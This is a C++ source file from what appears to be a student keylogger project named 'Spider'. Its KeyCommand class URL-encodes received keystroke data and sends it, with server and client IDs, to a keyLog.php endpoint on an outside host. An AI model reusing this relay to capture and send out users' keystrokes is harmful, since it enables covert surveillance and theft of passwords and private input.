//
// KeyCommand.cpp for  in /home/mediav_j/mabm/Spider/server/includes
//
// Made by Jérémy Mediavilla
// Login   <mediav_j@epitech.net>
//
// Started on  Mon Oct 26 15:23:34 2015 Jérémy Mediavilla
// Last update Sun Nov  8 00:03:09 2015 Joris Bertomeu
//

#include <KeyCommand.hh>
#include <HttpPost.hpp>

KeyCommand::KeyCommand()
{
  this->_id = 0b1;
}

KeyCommand::~KeyCommand()
{

}

bool		KeyCommand::execCommand(const std::string &srvId, const std::string &clientId, const std::string &command)
{
  (void)command;

  HttpPost::request("toto", std::string("http://jobertomeu.fr/spider/servlets/keyLog.php?server=" + srvId + "&client=" + clientId + "&data=" + std::string(HttpPost::url_encode((char*)command.c_str()))));
  std::cout << "Key Command" << std::endl;

  return (true);
}

void		KeyCommand::setId(const char &id)
{
  this->_id = id;
}

void		KeyCommand::setParameters(const std::string &parameters)
{
  this->_parameters = parameters;
}
